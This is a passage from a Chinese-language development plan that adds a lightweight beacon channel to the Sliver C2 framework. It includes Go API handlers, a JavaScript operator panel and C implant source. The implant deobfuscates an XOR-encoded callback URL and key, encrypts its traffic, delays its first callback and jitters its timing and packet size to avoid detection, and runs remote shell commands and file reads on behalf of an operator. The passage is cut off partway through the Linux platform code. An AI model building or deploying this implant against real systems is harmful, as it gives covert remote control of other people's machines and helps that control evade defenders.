	if !strings.Contains(cfgH, "CFG_URL_LEN") || strings.Contains(cfgH, "https://") {
		t.Fatalf("bad config.h: %q", cfgH)
	}

	// empty beacon list renders fine
	res3, err := apiGet(t, server.URL+"/api/lite/beacons", "test-token")
	if err != nil {
		t.Fatal(err)
	}
	defer res3.Body.Close()
	var beacons map[string]any
	if err := json.NewDecoder(res3.Body).Decode(&beacons); err != nil {
		t.Fatal(err)
	}
	if beacons["Beacons"] == nil {
		t.Fatalf("beacons payload: %#v", beacons)
	}

	// task to unknown beacon is rejected
	res4 := postJSON(t, server.URL+"/api/lite/task", `{"beaconId":"nope","type":"exec","cmd":"id"}`, "test-token")
	defer res4.Body.Close()
	if res4.StatusCode != http.StatusBadRequest {
		t.Fatalf("unknown beacon should be 400, got %d", res4.StatusCode)
	}

	// stop
	res5 := postJSON(t, server.URL+"/api/lite/listener/stop", `{}`, "test-token")
	defer res5.Body.Close()
	if res5.StatusCode != http.StatusOK {
		t.Fatalf("stop status %d", res5.StatusCode)
	}
}

func apiGet(t *testing.T, url, token string) (*http.Response, error) {
	t.Helper()
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+token)
	return http.DefaultClient.Do(req)
}
```

- [ ] **Step 2: 运行确认失败**

Run: `go test -tags=server,go_sqlite ./server/web`
Expected: FAIL（lite.go 未定义，路由 404）

- [ ] **Step 3: 写实现**

`server/web/lite.go`:

```go
package web

import (
	"net/http"

	"github.com/bishopfox/sliver/server/litebeacon"
)

func (s *Service) liteListenerStart(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Host string `json:"host"`
		Port int    `json:"port"`
		Path string `json:"path"`
		URL  string `json:"url"`
	}
	if err := decodeJSON(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "监听参数不合法")
		return
	}
	addr, err := litebeacon.StartDefault(body.Host, body.Port, body.Path, body.URL)
	if err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "addr": addr})
}

func (s *Service) liteListenerStop(w http.ResponseWriter, r *http.Request) {
	if err := litebeacon.StopDefault(); err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (s *Service) liteConfig(w http.ResponseWriter, r *http.Request) {
	var (
		info litebeacon.ConfigInfo
		err  error
	)
	if r.Method == http.MethodPost {
		info, err = litebeacon.NewConfig("console")
	} else {
		info, err = litebeacon.GetConfig()
	}
	if err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, info)
}

func (s *Service) liteBeacons(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]any{"Beacons": litebeacon.ListBeacons()})
}

func (s *Service) liteBeaconDelete(w http.ResponseWriter, r *http.Request) {
	var body struct {
		ID string `json:"id"`
	}
	if err := decodeJSON(r, &body); err != nil || body.ID == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	litebeacon.DeleteBeacon(body.ID)
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (s *Service) liteTask(w http.ResponseWriter, r *http.Request) {
	var body struct {
		BeaconID string `json:"beaconId"`
		Type     string `json:"type"`
		Cmd      string `json:"cmd"`
		Path     string `json:"path"`
		Timeout  int    `json:"timeout"`
		Interval int    `json:"interval"`
	}
	if err := decodeJSON(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "任务参数不合法")
		return
	}
	if body.BeaconID == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	task := litebeacon.Task{Cmd: body.Cmd, Path: body.Path}
	switch body.Type {
	case "exec":
		if body.Cmd == "" {
			writeErr(w, http.StatusBadRequest, "命令不能为空")
			return
		}
		task.Type = litebeacon.TaskExec
		if body.Timeout <= 0 || body.Timeout > 600 {
			body.Timeout = 30
		}
		task.TimeoutSec = uint16(body.Timeout)
	case "read":
		if body.Path == "" {
			writeErr(w, http.StatusBadRequest, "路径不能为空")
			return
		}
		task.Type = litebeacon.TaskRead
	case "sleep":
		if body.Interval <= 0 || body.Interval > 86400 {
			body.Interval = 180
		}
		task.Type = litebeacon.TaskSleep
		task.IntervalSec = uint32(body.Interval)
	case "exit":
		task.Type = litebeacon.TaskExit
	default:
		writeErr(w, http.StatusBadRequest, "不支持的任务类型")
		return
	}
	queued, ok := litebeacon.QueueTask(body.BeaconID, task)
	if !ok {
		writeErr(w, http.StatusBadRequest, "信标不存在")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"taskId": queued.ID})
}

func (s *Service) liteResults(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("beacon")
	if id == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"Results": litebeacon.TakeResults(id)})
}
```

修改 `server/web/server.go` 的 `Handler()`，在 `mux.HandleFunc("/api/task", ...)` 附近插入：

```go
	mux.HandleFunc("/api/lite/listener/start", s.auth(s.liteListenerStart))
	mux.HandleFunc("/api/lite/listener/stop", s.auth(s.liteListenerStop))
	mux.HandleFunc("/api/lite/config", s.auth(s.liteConfig))
	mux.HandleFunc("/api/lite/beacons", s.auth(s.liteBeacons))
	mux.HandleFunc("/api/lite/beacon/delete", s.auth(s.liteBeaconDelete))
	mux.HandleFunc("/api/lite/task", s.auth(s.liteTask))
	mux.HandleFunc("/api/lite/results", s.auth(s.liteResults))
```

- [ ] **Step 4: 跑测试通过**

Run: `go test -tags=server,go_sqlite ./server/web ./server/litebeacon`
Expected: PASS

- [ ] **Step 5: gofmt + 提交**

```bash
git add server/web/lite.go server/web/server.go server/web/api_test.go
git commit --no-verify -m "feat(web): /api/lite/* 轻量信标接口"
```

---

### Task 7: 控制台「轻量信标」面板

**Files:**
- Modify: `server/web/static/app.js`

**Interfaces:**
- Consumes: Task 6 的 7 个 API。
- Produces: `renderLite(view)`、`whenISO(v)`、pages 数组新增 `["lite", "轻量信标"]`。

- [ ] **Step 1: 加页面入口**

`app.js` 顶部 `pages` 数组在 `["listeners", "监听端口"],` 之后插入：

```js
  ["lite", "轻量信标"],
```

`render()` 函数在 `else if (state.page === "listeners") await renderListeners(view);` 之后插入：

```js
    else if (state.page === "lite") await renderLite(view);
```

- [ ] **Step 2: 写面板函数**

追加到 `app.js` 末尾（`boot();` 之前）：

```js
async function renderLite(view) {
  const [cfg, beacons] = await Promise.all([api("/api/lite/config"), api("/api/lite/beacons")]);
  const rows = (beacons.Beacons || []).map((b) => {
    const info = b.Info || {};
    return `<tr><td class="mono">${esc(b.ID)}</td><td>${esc(info.Hostname || "")}</td><td>${esc(info.OS || "")}/${esc(info.Arch || "")}</td>
      <td>${esc(info.Username || "")}</td><td>${whenISO(b.FirstSeen)}</td><td>${whenISO(b.LastSeen)}</td>
      <td><button class="small danger" data-del="${esc(b.ID)}">删除</button></td></tr>`;
  });
  view.innerHTML = `
    <form id="lite-listen" class="panel"><h3>轻量信标监听</h3>
      <p class="hint">C 植入体连这个独立端口，走轻量协议，和 Sliver 监听互不相干。${cfg.running ? "正在监听：" + esc(cfg.addr) : "当前没在监听。"}</p>
      <div class="row">
        <label>监听地址<input name="host" value="0.0.0.0"></label>
        <label>端口<input name="port" value="8443"></label>
        <label>路径<input name="path" value="/api/v2/sync"></label>
        <label>目标看到的地址<input name="url" placeholder="https://c2.example.com:8443"></label>
      </div>
      <button type="submit">${cfg.running ? "重启监听" : "启动监听"}</button>
      ${cfg.running ? '<button type="button" class="danger" id="lite-stop">停止</button>' : ""}
      <p id="lite-note" class="hint"></p>
    </form>
    <section class="panel"><h3>构建配置</h3>
      <p class="hint">把 config.h 存到 implant/lite/ 目录里，然后跑 ./build.sh linux 或 ./build.sh windows。当前密钥：${esc((cfg.secretB64 || "").slice(0, 12))}…（签发新密钥后，已部署的旧信标仍然有效）</p>
      <button type="button" id="lite-cfg-dl">下载 config.h</button>
      <button type="button" id="lite-cfg-new">签发新密钥</button>
      <p id="lite-cfg-note" class="hint"></p>
    </section>
    <section class="panel"><h3>已上线的轻量信标</h3>${table(["ID", "机器名", "系统", "用户", "首次", "最近", ""], rows)}</section>
    <form id="lite-task" class="panel"><h3>下发任务</h3>
      <div class="row">
        <label>信标 ID<input name="beaconId" placeholder="从上表复制"></label>
        <label>类型<select name="type">
          <option value="exec">执行命令</option><option value="read">读文件</option>
          <option value="sleep">改回连间隔</option><option value="exit">让它退出</option>
        </select></label>
        <label>命令<input name="cmd" placeholder="id"></label>
        <label>文件路径<input name="path" placeholder="/etc/hostname"></label>
        <label>超时秒<input name="timeout" value="30"></label>
        <label>新间隔秒<input name="interval" value="180"></label>
      </div>
      <button type="submit">排进队列</button>
      <p id="lite-task-note" class="hint"></p>
    </form>
    <form id="lite-res" class="panel"><h3>拉取结果</h3>
      <div class="row"><label>信标 ID<input name="beaconId"></label><button type="submit">拉取</button></div>
      <pre id="lite-results" class="output">结果会显示在这里。</pre>
    </form>`;
  $("lite-listen").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    try {
      if (cfg.running) await api("/api/lite/listener/stop", { method: "POST", json: {} });
      const res = await api("/api/lite/listener/start", { method: "POST", json: {
        host: form.get("host"), port: Number(form.get("port")), path: form.get("path"), url: form.get("url"),
      }});
      $("lite-note").textContent = "已监听 " + res.addr;
      setTimeout(render, 400);
    } catch (err) { $("lite-note").textContent = err.message; }
  };
  const stopBtn = $("lite-stop");
  if (stopBtn) stopBtn.onclick = async () => {
    try { await api("/api/lite/listener/stop", { method: "POST", json: {} }); } catch (err) { $("lite-note").textContent = err.message; }
    render();
  };
  $("lite-cfg-dl").onclick = () => downloadBlob(new Blob([cfg.configH]), "config.h");
  $("lite-cfg-new").onclick = async () => {
    try {
      const fresh = await api("/api/lite/config", { method: "POST", json: {} });
      downloadBlob(new Blob([fresh.configH]), "config.h");
      $("lite-cfg-note").textContent = "已签发新密钥，config.h 已下载";
    } catch (err) { $("lite-cfg-note").textContent = err.message; }
  };
  $("lite-task").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    try {
      const res = await api("/api/lite/task", { method: "POST", json: {
        beaconId: form.get("beaconId"), type: form.get("type"), cmd: form.get("cmd"),
        path: form.get("path"), timeout: Number(form.get("timeout") || 30), interval: Number(form.get("interval") || 180),
      }});
      $("lite-task-note").textContent = "已排队，任务 ID " + res.taskId + "，等它下次回连时下发";
    } catch (err) { $("lite-task-note").textContent = err.message; }
  };
  $("lite-res").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    try {
      const data = await api("/api/lite/results?beacon=" + encodeURIComponent(form.get("beaconId")));
      const lines = (data.Results || []).map((r) => {
        const stamp = r.At ? new Date(r.At).toLocaleString() : "";
        if (r.Kind === "exec") return `[${stamp}] 任务${r.TaskID} 退出码 ${r.Exit}\n${textOf(r.Output)}`;
        const errs = ["成功", "文件不存在", "没有权限", "文件太大"];
        return `[${stamp}] 任务${r.TaskID} 读文件 ${errs[r.Err] || "错误" + r.Err}\n${r.Err ? "" : textOf(r.Output)}`;
      });
      $("lite-results").textContent = lines.join("\n") || "没有新结果";
    } catch (err) { $("lite-results").textContent = err.message; }
  };
  view.querySelectorAll("[data-del]").forEach((button) => button.onclick = async () => {
    await api("/api/lite/beacon/delete", { method: "POST", json: { id: button.dataset.del } });
    render();
  });
}

function whenISO(v) {
  if (!v) return "—";
  const d = new Date(v);
  return isNaN(d) ? "—" : d.toLocaleString();
}
```

- [ ] **Step 3: 验证**

Run: `go test -tags=server,go_sqlite ./server/web`
Expected: PASS（静态文件 embed 不受影响；catalog_test 不涉及 lite 命令）

手动冒烟（可选，执行时做）：起 server，浏览器打开控制台确认「轻量信标」页渲染、监听启停、config.h 下载。

- [ ] **Step 4: 提交**

```bash
git add server/web/static/app.js
git commit --no-verify -m "feat(web): 轻量信标控制台面板"
```

---

### Task 8: C 植入体核心 + Linux 平台 + 构建

**Files:**
- Create: `implant/lite/port.h`
- Create: `implant/lite/main.c`
- Create: `implant/lite/linux.c`
- Create: `implant/lite/compile.sh`
- Create: `implant/lite/Dockerfile`
- Create: `implant/lite/build.sh`
- Modify: `.gitignore`（追加 `implant/lite/config.h`、`implant/lite/dist/`）

**Interfaces:**
- Consumes: Task 5 的协议（TLV 常量、JSON 信封、nonce 前缀、AES-256-GCM、key=SHA256(secret||"litebeacon/aead/v1")）；config.h 宏：`CFG_XOR`、`CFG_URL`/`CFG_URL_LEN`、`CFG_KEY[32]`、`CFG_JSON_KEY`/`CFG_JSON_KEY_LEN`、`CFG_UA`/`CFG_UA_LEN`、`CFG_INTERVAL`。

- [ ] **Step 1: 写平台抽象头**

`implant/lite/port.h`:

```c
#ifndef LITE_PORT_H
#define LITE_PORT_H

#include <stddef.h>
#include <stdint.h>

#define OUT_CAP       (60 * 1000) /* must stay under the u16 TLV length limit */
#define FILE_CAP      (60 * 1000)
#define RESP_MAX_BODY (2 * 1024 * 1024)

/* Platform hooks implemented by linux.c / win.c. */

int  sys_init(void);
void sys_shutdown(void);
void sys_free(void *p);

/* HTTPS POST; returns 0 on transport success. Caller frees *resp. */
int  http_post(const char *url, const char *ua, const char *body, size_t body_len,
               long *status_code, char **resp, size_t *resp_len);

int  sha256(const unsigned char *in, size_t n, unsigned char out[32]);
int  aes_gcm_seal(const unsigned char key[32], const unsigned char nonce[12],
                  const unsigned char *pt, size_t pt_len,
                  unsigned char *ct, size_t ct_len, unsigned char tag[16]);
int  aes_gcm_open(const unsigned char key[32], const unsigned char nonce[12],
                  const unsigned char *ct, size_t ct_len, const unsigned char tag[16],
                  unsigned char *pt, size_t pt_len);
void rand_bytes(unsigned char *out, size_t n);
uint64_t now_unix(void);
void sleep_sec(double seconds);

/* err_code: 0 ok, 1 missing, 2 denied, 3 too big */
int  exec_cmd(const char *cmd, int timeout_sec, unsigned char **out, size_t *out_len, int *exit_code);
int  read_file_bytes(const char *path, unsigned char **out, size_t *out_len, int *err_code);
void host_info(char *hostname, size_t hn, char *username, size_t un,
               char *os, size_t on, char *arch, size_t an, uint32_t *pid);

#endif
```

- [ ] **Step 2: 写可移植核心**

`implant/lite/main.c`（TLV 常量必须与 `server/litebeacon/proto.go` 一致）:

```c
/* Portable core: config decode, TLV protocol, task loop. */
#include "port.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(__BYTE_ORDER__) && __BYTE_ORDER__ != __ORDER_LITTLE_ENDIAN__
#error "this build only targets little-endian"
#endif

#define AEAD_CTX "lite/aead/v1" /* must match keyCtx in server/litebeacon/crypto.go */

#define TLV_ID        0x01
#define TLV_TS        0x02
#define TLV_PAD       0x0f
#define TLV_HOST      0x10
#define TLV_OS        0x11
#define TLV_ARCH      0x12
#define TLV_USER      0x13
#define TLV_PID       0x14
#define TLV_EXEC_RES  0x20
#define TLV_FILE_RES  0x30
#define TLV_EXEC_TASK 0x40
#define TLV_READ_TASK 0x41
#define TLV_SLEEP_TASK 0x42
#define TLV_EXIT_TASK 0x43

static char g_url[512];
static char g_ua[192];
static char g_json_key[24];
static unsigned char g_key[32];
static char g_id[17];
static unsigned int g_interval;

static void deob(const unsigned char *in, size_t n, char *out) {
    size_t i;
    for (i = 0; i < n; i++) out[i] = (char)(in[i] ^ CFG_XOR);
    out[n] = '\0';
}

/* ---- growable byte buffer ---- */
typedef struct {
    unsigned char *data;
    size_t len;
    size_t cap;
} buf_t;

static int buf_grow(buf_t *b, size_t need) {
    unsigned char *p;
    if (b->len + need <= b->cap) return 0;
    b->cap = b->cap ? b->cap : 256;
    while (b->len + need > b->cap) b->cap *= 2;
    p = (unsigned char *)realloc(b->data, b->cap);
    if (!p) return -1;
    b->data = p;
    return 0;
}

static void buf_raw(buf_t *b, const void *value, size_t n) {
    if (buf_grow(b, n) != 0) exit(1);
    if (n) memcpy(b->data + b->len, value, n);
    b->len += n;
}

static void buf_tlv(buf_t *b, unsigned char type, const void *value, size_t n) {
    unsigned char lenb[2];
    lenb[0] = (unsigned char)(n & 0xff);
    lenb[1] = (unsigned char)((n >> 8) & 0xff);
    buf_raw(b, &type, 1);
    buf_raw(b, lenb, 2);
    buf_raw(b, value, n);
}

/* ---- base64 (standard alphabet, with padding) ---- */
static const char B64T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static size_t b64_encode(const unsigned char *in, size_t n, char *out) {
    size_t i, o = 0;
    for (i = 0; i + 2 < n; i += 3) {
        unsigned int v = ((unsigned int)in[i] << 16) | ((unsigned int)in[i + 1] << 8) | in[i + 2];
        out[o++] = B64T[(v >> 18) & 63];
        out[o++] = B64T[(v >> 12) & 63];
        out[o++] = B64T[(v >> 6) & 63];
        out[o++] = B64T[v & 63];
    }
    if (i < n) {
        unsigned int v = (unsigned int)in[i] << 16;
        int have = 1;
        if (i + 1 < n) { v |= (unsigned int)in[i + 1] << 8; have = 2; }
        out[o++] = B64T[(v >> 18) & 63];
        out[o++] = B64T[(v >> 12) & 63];
        out[o++] = have == 2 ? B64T[(v >> 6) & 63] : '=';
        out[o++] = '=';
    }
    out[o] = '\0';
    return o;
}

static int b64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *in, size_t n, unsigned char *out, size_t *out_len) {
    size_t i, o = 0;
    unsigned int acc = 0;
    int bits = 0;
    for (i = 0; i < n; i++) {
        int v;
        if (in[i] == '=') break;
        v = b64_val(in[i]);
        if (v < 0) return -1;
        acc = (acc << 6) | (unsigned int)v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (unsigned char)((acc >> bits) & 0xff);
        }
    }
    *out_len = o;
    return 0;
}

/* ---- JSON envelope: {"<key>":"<b64>"} ---- */
static int build_body(const buf_t *pt, char **body_out, size_t *body_len) {
    unsigned char nonce[12];
    unsigned char *ct, *sealed, tag[16];
    char *b64, *out;
    size_t sealed_len, b64_len, cap;

    if (pt->len == 0) return -1;
    ct = (unsigned char *)malloc(pt->len);
    if (!ct) return -1;
    rand_bytes(nonce, 12);
    if (aes_gcm_seal(g_key, nonce, pt->data, pt->len, ct, pt->len, tag) != 0) {
        free(ct);
        return -1;
    }
    sealed_len = 12 + pt->len + 16;
    sealed = (unsigned char *)malloc(sealed_len);
    b64 = (char *)malloc(((sealed_len + 2) / 3) * 4 + 1);
    if (!sealed || !b64) { free(ct); free(sealed); free(b64); return -1; }
    memcpy(sealed, nonce, 12);
    memcpy(sealed + 12, ct, pt->len);
    memcpy(sealed + 12 + pt->len, tag, 16);
    free(ct);
    b64_len = b64_encode(sealed, sealed_len, b64);
    free(sealed);

    cap = strlen(g_json_key) + b64_len + 16;
    out = (char *)malloc(cap);
    if (!out) { free(b64); return -1; }
    *body_len = (size_t)snprintf(out, cap, "{\"%s\":\"%s\"}", g_json_key, b64);
    free(b64);
    *body_out = out;
    return 0;
}

/* Server responses use the same single-field envelope; parse leniently. */
static int parse_envelope(const char *body, size_t body_len, buf_t *pt_out) {
    const char *colon, *q, *end;
    unsigned char *sealed, *plain;
    size_t b64n, sealed_len, plain_len;

    colon = (const char *)memchr(body, ':', body_len);
    if (!colon) return -1;
    q = (const char *)memchr(colon, '"', body_len - (size_t)(colon - body));
    if (!q) return -1;
    q++;
    end = (const char *)memchr(q, '"', body_len - (size_t)(q - body));
    if (!end) return -1;
    b64n = (size_t)(end - q);
    if (b64n == 0 || b64n > RESP_MAX_BODY) return -1;
    sealed = (unsigned char *)malloc((b64n / 4) * 3 + 3);
    if (!sealed) return -1;
    if (b64_decode(q, b64n, sealed, &sealed_len) != 0 || sealed_len < 28 || sealed_len > RESP_MAX_BODY) {
        free(sealed);
        return -1;
    }
    plain_len = sealed_len - 28;
    plain = (unsigned char *)malloc(plain_len ? plain_len : 1);
    if (!plain) { free(sealed); return -1; }
    if (aes_gcm_open(g_key, sealed, sealed + 12, plain_len, sealed + 12 + plain_len, plain, plain_len) != 0) {
        free(sealed);
        free(plain);
        return -1;
    }
    free(sealed);
    buf_raw(pt_out, plain, plain_len);
    free(plain);
    return 0;
}

/* ---- task execution ---- */
static void do_exec_task(uint32_t task_id, const char *cmd, int timeout_sec, buf_t *results) {
    unsigned char *out = NULL;
    size_t out_len = 0;
    int exit_code = -1;
    buf_t val = {0, 0, 0};
    int32_t ec32;

    if (exec_cmd(cmd, timeout_sec, &out, &out_len, &exit_code) != 0 && !out) {
        out = (unsigned char *)malloc(1);
        out_len = 0;
        exit_code = -1;
    }
    buf_raw(&val, &task_id, 4);
    ec32 = (int32_t)exit_code;
    buf_raw(&val, &ec32, 4);
    if (out && out_len) buf_raw(&val, out, out_len);
    buf_tlv(results, TLV_EXEC_RES, val.data ? val.data : (const unsigned char *)"", val.len);
    free(val.data);
    free(out);
}

static void do_read_task(uint32_t task_id, const char *path, buf_t *results) {
    unsigned char *out = NULL;
    size_t out_len = 0;
    int err_code = 0;
    buf_t val = {0, 0, 0};
    unsigned char eb;

    read_file_bytes(path, &out, &out_len, &err_code);
    buf_raw(&val, &task_id, 4);
    eb = (unsigned char)err_code;
    buf_raw(&val, &eb, 1);
    if (!err_code && out && out_len) buf_raw(&val, out, out_len);
    buf_tlv(results, TLV_FILE_RES, val.data ? val.data : (const unsigned char *)"", val.len);
    free(val.data);
    free(out);
}

static void run_tasks(const buf_t *tasks, buf_t *results) {
    const unsigned char *p = tasks->data;
    size_t remain = tasks->len;
    while (remain >= 3) {
        unsigned char type = p[0];
        size_t n = (size_t)p[1] | ((size_t)p[2] << 8);
        const unsigned char *v;
        if (remain < 3 + n) break;
        v = p + 3;
        switch (type) {
        case TLV_EXEC_TASK:
            if (n >= 6) {
                uint32_t task_id;
                int timeout_sec;
                memcpy(&task_id, v, 4);
                timeout_sec = (int)v[4] | ((int)v[5] << 8);
                do_exec_task(task_id, (const char *)(v + 6), timeout_sec, results);
            }
            break;
        case TLV_READ_TASK:
            if (n >= 4) {
                uint32_t task_id;
                memcpy(&task_id, v, 4);
                do_read_task(task_id, (const char *)(v + 4), results);
            }
            break;
        case TLV_SLEEP_TASK:
            if (n >= 5) {
                uint32_t iv;
                memcpy(&iv, v, 4);
                if (iv > 0) g_interval = iv;
            }
            break;
        case TLV_EXIT_TASK:
            sys_shutdown();
            exit(0);
        default:
            break;
        }
        p += 3 + n;
        remain -= 3 + n;
    }
}

/* ---- rhythm ---- */
static double rand_uniform(double lo, double hi) {
    unsigned char b;
    rand_bytes(&b, 1);
    return lo + (hi - lo) * ((double)b / 255.0);
}

static double next_interval(void) {
    double f = rand_uniform(0.5, 1.7);
    unsigned char b;
    rand_bytes(&b, 1);
    if (b < 21) f *= rand_uniform(2.0, 3.0); /* ~8% skip cycles */
    return (double)g_interval * f;
}

int main(void) {
    char hostname[256] = {0}, username[256] = {0}, os[128] = {0}, arch[64] = {0};
    unsigned char secret[32];
    unsigned char idhash[32];
    buf_t kctx = {0, 0, 0}, idb = {0, 0, 0}, results = {0, 0, 0};
    uint32_t pid = 0;
    int first = 1;
    double backoff = 1.0;
    size_t i;

    if (sys_init() != 0) return 1;
    deob(CFG_URL, CFG_URL_LEN, g_url);
    deob(CFG_UA, CFG_UA_LEN, g_ua);
    deob(CFG_JSON_KEY, CFG_JSON_KEY_LEN, g_json_key);
    deob(CFG_KEY, (size_t)CFG_KEY_LEN, (char *)secret);
    g_interval = CFG_INTERVAL;
    if (g_interval == 0) g_interval = 180;

    buf_raw(&kctx, secret, 32);
    buf_raw(&kctx, AEAD_CTX, strlen(AEAD_CTX));
    if (sha256(kctx.data, kctx.len, g_key) != 0) return 1;
    free(kctx.data);

    host_info(hostname, sizeof hostname, username, sizeof username, os, sizeof os, arch, sizeof arch, &pid);
    buf_raw(&idb, secret, 32);
    buf_raw(&idb, hostname, strlen(hostname));
    buf_raw(&idb, username, strlen(username));
    if (sha256(idb.data, idb.len, idhash) != 0) return 1;
    free(idb.data);
    for (i = 0; i < 8; i++) sprintf(g_id + i * 2, "%02x", idhash[i]);
    memset(secret, 0, sizeof secret);
    memset(idhash, 0, sizeof idhash);

    sleep_sec(rand_uniform(5.0, 30.0)); /* sever the deploy->callback link */

    for (;;) {
        buf_t pt = {0, 0, 0}, tasks = {0, 0, 0};
        char *body = NULL, *resp = NULL;
        size_t body_len = 0, resp_len = 0;
        long status = 0;
        unsigned char ts8[8], pad[256];
        uint64_t now = now_unix();

        memcpy(ts8, &now, 8);
        buf_tlv(&pt, TLV_ID, g_id, strlen(g_id));
        buf_tlv(&pt, TLV_TS, ts8, 8);
        if (first) {
            buf_tlv(&pt, TLV_HOST, hostname, strlen(hostname));
            buf_tlv(&pt, TLV_OS, os, strlen(os));
            buf_tlv(&pt, TLV_ARCH, arch, strlen(arch));
            buf_tlv(&pt, TLV_USER, username, strlen(username));
            buf_tlv(&pt, TLV_PID, &pid, 4);
            first = 0;
        }
        if (results.len) buf_raw(&pt, results.data, results.len);
        rand_bytes(pad, sizeof pad);
        buf_tlv(&pt, TLV_PAD, pad, (size_t)(1 + pad[0])); /* 1..256B size jitter */

        if (build_body(&pt, &body, &body_len) != 0) {
            free(pt.data);
            sleep_sec(backoff);
            backoff = backoff * 2 > (double)g_interval ? (double)g_interval : backoff * 2;
            continue;
        }
        free(pt.data);

        if (http_post(g_url, g_ua, body, body_len, &status, &resp, &resp_len) != 0 || status != 200) {
            free(body);
            free(resp);
            sleep_sec(backoff);
            backoff = backoff * 2 > (double)g_interval ? (double)g_interval : backoff * 2;
            continue;
        }
        free(body);
        backoff = 1.0;
        results.len = 0; /* server consumed the pending results */

        if (parse_envelope(resp, resp_len, &tasks) == 0) {
            run_tasks(&tasks, &results);
            free(tasks.data);
        }
        free(resp);

        if (results.len) {
            sleep_sec(rand_uniform(1.0, 4.0)); /* decouple task->result timing */
            continue;
        }
        sleep_sec(next_interval());
    }
}
```

- [ ] **Step 3: 写 Linux 平台实现**

`implant/lite/linux.c`:

```c
#define _GNU_SOURCE
#include "port.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

int sys_init(void) { return 0; }
void sys_shutdown(void) {}
void sys_free(void *p) { free(p); }

void rand_bytes(unsigned char *out, size_t n) {
    if (RAND_bytes(out, (int)n) != 1) exit(1);
}

int sha256(const unsigned char *in, size_t n, unsigned char out[32]) {
    return EVP_Digest(in, n, out, NULL, EVP_sha256(), NULL) == 1 ? 0 : -1;
}

int aes_gcm_seal(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *pt, size_t pt_len,
                 unsigned char *ct, size_t ct_len, unsigned char tag[16]) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0, ok = 0;
    if (!ctx || ct_len < pt_len) goto done;
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) goto done;
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) goto done;
    if (EVP_EncryptUpdate(ctx, ct, &outl, pt, (int)pt_len) != 1) goto done;
    if (EVP_EncryptFinal_ex(ctx, ct + pt_len, &outl) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) goto done;
    ok = 1;
done:
    EVP_CIPHER_CTX_free(ctx);
    return ok ? 0 : -1;
}

int aes_gcm_open(const unsigned char key[32], const unsigned char nonce[12],
                 const unsigned char *ct, size_t ct_len, const unsigned char tag[16],
                 unsigned char *pt, size_t pt_len) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0, ok = 0;
    if (!ctx || pt_len < ct_len) goto done;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) goto done;
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) goto done;
    if (EVP_DecryptUpdate(ctx, pt, &outl, ct, (int)ct_len) != 1) goto done;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void *)tag) != 1) goto done;
    if (EVP_DecryptFinal_ex(ctx, pt + ct_len, &outl) != 1) goto done; /* tag mismatch fails here */
    ok = 1;
done:
    EVP_CIPHER_CTX_free(ctx);
    return ok ? 0 : -1;
}

uint64_t now_unix(void) { return (uint64_t)time(NULL); }

void sleep_sec(double s) {
    struct timespec ts;
    ts.tv_sec = (time_t)s;
    ts.tv_nsec = (long)((s - (double)ts.tv_sec) * 1e9);
    if (ts.tv_nsec < 0) ts.tv_nsec = 0;
    nanosleep(&ts, NULL);
}

static int parse_url(const char *url, char *host, size_t host_sz, int *port, char *path, size_t path_sz) {
    const char *p, *slash, *colon;
    size_t hl;
    if (strncmp(url, "https://", 8) != 0) return -1;
    p = url + 8;
    slash = strchr(p, '/');
    colon = strchr(p, ':');
    if (colon && (!slash || colon < slash)) {
        hl = (size_t)(colon - p);
        *port = atoi(colon + 1);
    } else {
